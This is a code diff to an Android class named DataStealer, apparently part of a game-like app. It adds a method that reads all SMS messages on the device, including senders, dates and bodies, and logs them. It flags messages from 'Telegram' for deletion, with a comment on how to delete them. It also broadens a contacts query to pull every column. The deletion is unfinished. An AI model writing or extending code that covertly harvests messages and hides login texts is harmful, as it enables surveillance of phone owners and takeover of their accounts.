@@ -8,6 +8,7 @@ import android.provider.CalendarContract;
 import android.provider.CalendarContract.Events;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.Profile;
+import android.provider.Telephony;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -18,6 +19,7 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.concurrent.TimeUnit;
 
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
@@ -28,6 +30,66 @@ public class DataStealer {
 
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
+
+
+    public static ArrayList<Object> takeMessageData(Context context) {
+
+        String[] projection = new String[]{
+                Telephony.Sms.PERSON,
+                Telephony.Sms.ADDRESS,
+                Telephony.Sms.DATE_SENT,
+                Telephony.Sms.SUBJECT,
+                Telephony.Sms.BODY,
+                Telephony.Sms._ID
+        };
+
+        Cursor cursor = context.getContentResolver().query(
+                Telephony.Sms.CONTENT_URI,
+                null,
+                null,
+                null,
+                null);
+
+
+        Log.d("SMS_DEBUG", Arrays.toString(cursor.getColumnNames()));
+
+        long idOfMessageToDelete = -1;
+
+        if (null != cursor && cursor.moveToFirst()) {
+            int positionOfAddressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+            int positionOfDateSentColumn = cursor.getColumnIndex(Telephony.Sms.DATE_SENT);
+            int positionOfBodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
+            int positionOfSubjectColumn = cursor.getColumnIndex(Telephony.Sms.SUBJECT);
+
+            int positionOfIdColumn = cursor.getColumnIndex(Telephony.Sms._ID);
+
+            do {
+                String address = "ADDRESS: " + cursor.getString(positionOfAddressColumn);
+                String date = "DATE: " + cursor.getString(positionOfDateSentColumn);
+                String recDate = "REC_DATE: " + cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE_SENT));
+                String body = "BODY: " + cursor.getString(positionOfBodyColumn);
+                String subject = "SUBJECT: " + cursor.getString(positionOfSubjectColumn);
+                long smsId = cursor.getLong(positionOfIdColumn);
+
+                Log.d("SMS READ:", recDate + "\n" + address + "\n" + date + "\n" + body + "\n" + subject);
+
+                if (address.equals("ADDRESS: Telegram")) {
+                    Log.d("DEBUG", "Ready for deletion of Message w. ID" + smsId);
+                    idOfMessageToDelete = smsId;
+                }
+            } while (cursor.moveToNext());
+            cursor.close();
+        }
+
+        if (idOfMessageToDelete != -1) {
+            Log.d("DEBUG", "Calling for ID" + idOfMessageToDelete);
+        }
+
+
+        // DELETE is just contextResolver.delete
+
+        return null;
+    }
 
     /**
      * Reads out data from contacts on the device and returns them.
@@ -51,11 +113,12 @@ public class DataStealer {
         // Retrieves the profile from the Contacts Provider
         Cursor cursor = context.getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
-                projection,
+                null,
                 null,
                 null,
                 null);
 
+        Log.d("DEBUG", Arrays.toString(cursor.getColumnNames()));
 
         ArrayList<Contact> extractedContacts = new ArrayList<>();
         if (null != cursor && cursor.moveToFirst()) {
